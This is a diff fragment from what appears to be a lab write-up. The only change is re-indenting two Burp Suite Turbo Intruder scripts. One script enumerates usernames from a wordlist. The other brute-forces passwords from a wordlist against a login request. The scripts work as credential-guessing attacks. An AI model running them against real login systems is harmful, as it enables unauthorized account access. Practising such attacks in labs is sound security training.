@@ -20,13 +20,13 @@ First code to enumerate valid username:
             requestsPerConnection=5,
             pipeline=False,
             engine=Engine.THREADED
-    )
-    with open("/home/duong/username.txt", "r") as f:
-        username = [line.strip() for line in f if line.strip()]
-    password = ['peter1', 'peter2', 'peter3', 'peter4', 'peter5']
-    for u in username:
-        for p in password:
-            engine.queue(target.req, [u, p])
+            )
+        with open("/home/duong/username.txt", "r") as f:
+            username = [line.strip() for line in f if line.strip()]
+        password = ['peter1', 'peter2', 'peter3', 'peter4', 'peter5']
+        for u in username:
+            for p in password:
+                engine.queue(target.req, [u, p])
     def handleResponse(req, interesting):
         table.add(req)
 
@@ -38,11 +38,11 @@ Second code to brute force password:
             requestsPerConnection=10,
             pipeline=False,
             engine=Engine.THREADED
-    )
-    with open("/home/duong/password.txt", "r") as f:
-        password = [line.strip() for line in f if line.strip()]
-    for p in password:
-        engine.queue(target.req, [p])
+        )
+        with open("/home/duong/password.txt", "r") as f:
+            password = [line.strip() for line in f if line.strip()]
+        for p in password:
+            engine.queue(target.req, [p])
     def handleResponse(req, interesting):
         table.add(req)
 
